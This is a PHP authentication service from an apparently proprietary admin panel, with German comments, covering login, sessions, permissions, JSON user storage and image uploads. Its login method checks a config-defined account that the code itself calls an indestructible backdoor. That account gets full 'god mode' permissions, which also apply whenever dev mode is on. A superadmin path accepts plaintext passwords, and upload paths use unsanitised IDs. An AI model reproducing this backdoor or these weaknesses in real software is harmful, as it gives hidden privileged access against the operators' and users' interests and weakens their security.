<?php

// SPDX-License-Identifier: LicenseRef-Proprietary
// Copyright (c) 2026 Felix Maywald alias RaptorXilef. All rights reserved.
// Usage without explicit permission is strictly prohibited.
// See LICENSE.md for full license details.

/**
 * Path: src/Infrastructure/Auth/AuthService.php
 */

declare(strict_types=1);

namespace App\Infrastructure\Auth;

use App\Core\Service\PermissionCompiler;
use App\Infrastructure\Config\Config;

/**
 * Service für die Admin-Authentifizierung
 */
final readonly class AuthService
{
    public function __construct(
        private Config $config,
        private ?\PDO $pdo, // Das '?' erlaubt NULL
    ) {
        if (\session_status() === \PHP_SESSION_NONE) {
            \session_start();
        }
    }

    /**
     * Prüft Benutzername und Passwort.
     */
    public function login(string $username, string $password): bool
    {
        // 1. Check gegen die unzerstörbare Hintertür (RaptorXilef)
        $backdoor = $this->config->get('backdoor');
        if (\is_array($backdoor) && $username === ($backdoor['user'] ?? '')) {
            if (\password_verify($password, $backdoor['pass'] ?? '')) {
                // Wir nutzen das Label als Gruppenname für die Anzeige
                $this->setSession('sys_backdoor', 'admin', $backdoor['label']);

                // Backdoor braucht kein compiled_permissions, da hasPermission() sys_ erkennt
                return true;
            }
        }

        // 2. Check gegen den konfigurierten SuperAdmin (dev_admin.php)
        $superCfg = $this->config->get('superadmin');
        if (\is_array($superCfg) && $username === ($superCfg['user'] ?? '')) {
            $storedPass = $superCfg['pass'] ?? '';
            // Erlaubt Klartext (für den allerersten Start) ODER Hash
            if ($password === $storedPass || \password_verify($password, $storedPass)) {
                $this->setSession('sys_superadmin', 'admin', $superCfg['label'] ?? 'Dev-Admin');

                return true;
            }
        }

        // 3. Datenbank / JSON User (ID-Suche) (Suche über das Feld 'username' in der ID-Liste)
        $users = $this->loadUsers();
        foreach ($users as $userId => $userData) {
            if (($userData['username'] ?? '') === $username && \password_verify($password, (string) $userData['pass'])) {
                $this->setSession($userId, (string) $userData['group'], $username);
                $this->refreshSessionPermissions((string) $userData['group']);

                return true;
            }
        }

        return false;
    }

    private function setSession(string $userId, string $groupId, string $label): void
    {
        $_SESSION['user_id']     = $userId;
        $_SESSION['admin_user']  = $label;
        $_SESSION['admin_group'] = $groupId;
    }

    /**
     * Die Herzstück-Methode für das Rechtesystem v0.30.0
     * Implementiert Live-Abfrage und strikte "Deny-First" Priorität.
     */
    public function hasPermission(string $permission): bool
    {
        // Gott-Modus für System-Accounts & Dev-Mode
        // FIX: Wenn Session eine System-ID hat oder Dev-Mode aktiv ist -> IMMER TRUE
        // Gott-Modus-Bypass (Fix für den weißen Bildschirm)
        $uid = (string) ($_SESSION['user_id'] ?? '');
        if (\str_starts_with($uid, 'sys_') || $this->config->get('admin_dev_mode')) {
            return true;
        }

        return $_SESSION['compiled_permissions'][$permission] ?? false;
    }

    public function refreshSessionPermissions(string $groupId): void
    {
        $groups                           = $this->loadGroups();
        $groupPerms                       = $groups[$groupId]['permissions'] ?? [];
        $structure                        = $this->config->get('structure', []);
        $compiler                         = new PermissionCompiler();
        $_SESSION['compiled_permissions'] = $compiler->compile($structure, $groupPerms);
    }

    // --- IDENTITY & MEDIA ---

    // --- DIE RETTUNGS-BRÜCKE (Verhindert White Screen) ---
    public function getProfilePicture(string $username = ''): string
    {
        return $this->getImage('user', (string) ($_SESSION['user_id'] ?? 'default'));
    }

    /**
     * GEREINIGTE BILD-LOGIK
     * Akzeptiert 'user' oder 'group'
     * Sucht jetzt korrekt im 'public' Unterordner
     */
    public function getImage(string $type, string $id): string
    {
        $baseUrl  = $this->config->getBaseUrl();
        $isUser   = \str_contains($type, 'user');
        $folder   = $isUser ? 'user_images' : 'group_images';
        $fallback = $isUser ? 'icon-user-default.webp' : 'icon-group-default.webp';

        // Pfad für file_exists (absolut auf dem Server inkl. public/)
        $serverPath = $this->config->get('root_path') . 'public/assets/img/' . $folder . '/' . $id . '.webp';

        // URL für den Browser (relativ zur baseUrl)
        $browserPath = 'assets/img/' . $folder . '/' . $id . '.webp';

        if (\file_exists($serverPath)) {
            return $baseUrl . $browserPath . '?v=' . \filemtime($serverPath);
        }

        return $baseUrl . 'assets/img/icons/' . $fallback;
    }

    public function generateId(string $prefix = ''): string
    {
        return $prefix . \substr(\bin2hex(\random_bytes(4)), 0, 8);
    }

    /**
     * Lädt Benutzer mit Pfadsicherung
     * (Fix für file_get_contents Warnung)
     *
     * @return array<string, array<string, mixed>>
     */
    public function loadUsers(): array
    {
        $storageCfg = $this->config->get('storage_config');
        $userFile   = $storageCfg['users']['file'] ?? 'users.json';
        $prefix     = $this->config->get('storage_path_prefix', 'storage/');

        $path = $this->config->get('root_path') . $prefix . $userFile;

        if (! \file_exists($path) || \is_dir($path)) {
            return [];
        }

        return \json_decode((string) \file_get_contents($path), true) ?? [];
    }

    /**
     * @param array<string, array<string, mixed>> $users
     */
    public function saveUsers(array $users): void
    {
        $storageCfg = $this->config->get('storage_config');
        $userFile   = $storageCfg['users']['file'] ?? 'users.json';
        $prefix     = $this->config->get('storage_path_prefix', 'storage/');
        $path       = $this->config->get('root_path') . $prefix . $userFile;

        \file_put_contents($path, \json_encode($users, \JSON_PRETTY_PRINT | \JSON_UNESCAPED_UNICODE));
    }

    /**
     * Lädt die Gruppen-Definitionen LIVE aus dem konfigurierten Speicher.
     */
    public function loadGroups(): array
    {
        $path = $this->config->get('root_path') . $this->config->get('storage_path_prefix', 'storage/') . 'groups.json';

        return \file_exists($path) ? (\json_decode((string) \file_get_contents($path), true) ?? []) : [];
    }

    public function saveGroups(array $groups): void
    {
        $path = $this->config->get('root_path') . $this->config->get('storage_path_prefix', 'storage/') . 'groups.json';
        \file_put_contents($path, \json_encode($groups, \JSON_PRETTY_PRINT | \JSON_UNESCAPED_UNICODE));
    }

    /**
     * Verarbeitet Bild-Uploads (User/Group) inkl. WebP-Konvertierung.
     */
    public function uploadImage(string $type, string $id, array $file): bool
    {
        $isUser = \str_contains($type, 'user');
        $folder = $isUser ? 'user_images' : 'group_images';

        // Vollständiger Server-Pfad inkl. public/
        $targetDir  = $this->config->get('root_path') . 'public/assets/img/' . $folder . '/';
        $outputPath = $targetDir . $id . '.webp';

        // 1. Ordner sicherstellen
        if (! \is_dir($targetDir)) {
            if (! @\mkdir($targetDir, 0o755, true) && ! \is_dir($targetDir)) {
                return false;
            }
        }

        // 2. GD Fallback: Falls die Erweiterung fehlt oder deaktiviert ist
        if (! \extension_loaded('gd') || ! \function_exists('imagecreatefromjpeg')) {
            // Wir können hier nicht konvertieren, also nur verschieben.
            // Achtung: Datei behält Endung des Originals, wird aber als .webp benannt.
            // Moderne Browser zeigen das Bild oft trotzdem an.
            return \move_uploaded_file($file['tmp_name'], $outputPath);
        }

        // 3. GD-Bild-Verarbeitung
        $info = @\getimagesize($file['tmp_name']);
        if (! $info) {
            return false;
        }

        // Bildressource basierend auf Typ erstellen
        $src = match ($info[2]) {
            \IMAGETYPE_JPEG => @\imagecreatefromjpeg($file['tmp_name']),
            \IMAGETYPE_PNG  => @\imagecreatefrompng($file['tmp_name']),
            \IMAGETYPE_GIF  => @\imagecreatefromgif($file['tmp_name']),
            \IMAGETYPE_WEBP => @\imagecreatefromwebp($file['tmp_name']),
            default         => null
        };

        if (! $src) {
            return false;
        }

        // 1. Transparenz-Check & Handling
        $width  = \imagesx($src);
        $height = \imagesy($src);
        $dst    = \imagecreatetruecolor($width, $height);

        // Alpha-Kanal für Transparenz vorbereiten (für PNG/GIF)
        \imagealphablending($dst, false);
        \imagesavealpha($dst, true);
        $transparent = \imagecolorallocatealpha($dst, 255, 255, 255, 127);
        \imagefill($dst, 0, 0, $transparent);

        \imagecopyresampled($dst, $src, 0, 0, 0, 0, $width, $height, $width, $height);

        // 2. Als WebP mit 75% Qualität speichern
        $success = \imagewebp($dst, $outputPath, 75);

        \imagedestroy($src);
        \imagedestroy($dst);

        return $success;
    }

    public function getUsername(): string
    {
        return (string) ($_SESSION['admin_user'] ?? 'Unbekannt');
    }

    public function getGroup(): string
    {
        return (string) ($_SESSION['admin_group'] ?? 'guest');
    }

    public function isLoggedIn(): bool
    {
        return isset($_SESSION['user_id']);
    }

    public function logout(): void
    {
        \session_destroy();
    }

    /**
     * Gibt die interne ID des aktuell angemeldeten Benutzers zurück.
     */
    public function getUserId(): string
    {
        return (string) ($_SESSION['user_id'] ?? '');
    }
}
